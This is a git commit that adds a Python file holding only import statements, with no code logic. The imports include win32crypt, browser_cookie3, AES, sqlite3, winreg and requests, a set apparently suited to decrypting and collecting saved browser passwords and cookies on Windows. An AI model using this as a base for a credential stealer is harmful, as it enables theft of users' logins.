b5d37e79646d1a2d0e495dd424c40eb1017f0452
exsarorrayzer <theleapy@gmail.com>
2025-12-31 19:31:29 +0400

    Add imports to raw/imports.py

---
+++ raw/imports.py
@@ -0,0 +1,26 @@
+import os
+import sys
+import json
+import sqlite3
+import shutil
+import base64
+import zipfile
+import tempfile
+import requests
+import win32crypt
+import browser_cookie3
+import glob
+import winreg
+import ctypes
+import subprocess
+import psutil
+import threading
+import time
+import re
+import ctypes.wintypes
+from Crypto.Cipher import AES
+import pythoncom
+from win32com.shell import shell, shellcon
+import win32api
+import win32con
+import win32security
